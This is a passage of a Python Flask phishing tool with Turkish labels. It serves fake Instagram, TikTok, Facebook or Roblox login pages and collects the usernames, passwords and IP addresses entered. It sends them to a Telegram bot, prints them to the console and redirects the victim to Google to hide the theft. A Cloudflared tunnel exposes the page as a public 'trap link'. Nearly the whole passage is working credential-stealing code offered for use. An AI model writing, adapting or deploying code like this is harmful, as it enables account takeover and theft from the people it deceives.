            .divider::before, .divider::after {{ content: ""; flex: 1; height: 1px; background: #dbdbdb; }}
            .divider span {{ padding: 0 10px; font-size: 12px; color: #8e8e8e; font-weight: 600; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #8e8e8e; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">{platform}</div>
            <p class="info-text">{desc}</p>
            <form action="/login" method="post">
                <input type="text" name="user" placeholder="Kullanıcı adı veya e-posta" required>
                <input type="password" name="pass" placeholder="Şifre" required>
                <input type="hidden" name="platform" value="{platform}">
                <button type="submit">Giriş Yap</button>
            </form>
            <div class="divider"><span>VEYA</span></div>
            <div class="footer">© 2026 {platform} from Meta</div>
        </div>
    </body>
    </html>
    """

# --- BACKEND İŞLEMLERİ ---
current_plat = "Instagram"

@app.route('/')
def home():
    return render_template_string(get_pro_html(current_plat))

@app.route('/login', methods=['POST'])
def login():
    u, p, plat, ip = request.form.get('user'), request.form.get('pass'), request.form.get('platform'), request.remote_addr
    if log_config["mod"] == "telegram":
        msg = f"🎯 **HESAP DÜŞTÜ!**\n\n📌 P: {plat}\n👤 U: `{u}`\n🔑 P: `{p}`\n🌐 IP: {ip}"
        requests.post(f"https://api.telegram.org/bot{log_config['token']}/sendMessage", data={"chat_id": log_config['id'], "text": msg, "parse_mode": "Markdown"})
    
    print(f"\n{Fore.RED}{'='*40}\n[!] YENİ LOG GELDİ\n{'-'*40}")
    print(f"{Fore.YELLOW}Platform : {Fore.WHITE}{plat}\n{Fore.YELLOW}Kullanıcı: {Fore.CYAN}{u}\n{Fore.YELLOW}Şifre    : {Fore.CYAN}{p}\n{Fore.YELLOW}IP       : {Fore.WHITE}{ip}\n{Fore.RED}{'='*40}")
    return redirect(f"https://www.google.com/search?q={plat}+login+success")

# --- TÜNEL VE BAŞLATICI ---
def start_t():
    print(f"\n{Fore.CYAN}[*] Cloudflared tüneli kuruluyor...")
    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:5000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in proc.stdout:
        if "trycloudflare.com" in line:
            url = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if url:
                print(f"\n{Fore.GREEN}[+] TUZAK LİNKİ: {Fore.YELLOW}{url.group(0)}")
                break

def main():
    global log_config, current_plat
    log_config = log_setup()
    banner()
    options = {"1": "Instagram", "2": "TikTok", "3": "Facebook", "4": "Roblox"}
    for k, v in options.items(): print(f"{Fore.YELLOW}[{k}] {Fore.WHITE}{v} Paneli")
    
    sec = input(f"\n{Fore.GREEN}Hedef Seçin > {Fore.WHITE}")
    current_plat = options.get(sec, "Instagram")
    
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
    time.sleep(2)
    start_t()

if __name__ == "__main__":
    main()

